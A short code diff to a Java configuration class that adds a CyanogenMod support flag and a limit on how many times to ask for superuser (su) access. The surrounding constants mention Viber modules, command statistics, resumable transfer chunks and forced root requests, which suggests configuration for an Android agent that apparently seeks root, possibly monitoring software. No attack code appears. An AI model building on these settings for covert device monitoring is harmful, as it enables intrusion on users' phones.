@@ -29,10 +29,12 @@ public class Cfg {
 	public static final boolean STATISTICS = false; // enable statistics on crypto and on commands
 	
 	public static final boolean ENABLE_EXPERIMENTAL_MODULES = false; // enables viber modules
+	public static boolean SUPPORT_CYANOGENMOD = false;
 
 	public static final int PROTOCOL_CHUNK = 256 * 1024; // chunk size fot resume
 	public static final int EV_QUEUE_LEN = 8;
 	public static final int EV_BLOCK_SIZE = 256 * 1024;
+	public static final int MAX_ASKED_SU = 2; // maximum number of su ask
 	
 	public static final boolean USE_SD = true; // try to use sd if available
 	public static final boolean FORCE_ROOT = false; // force root request
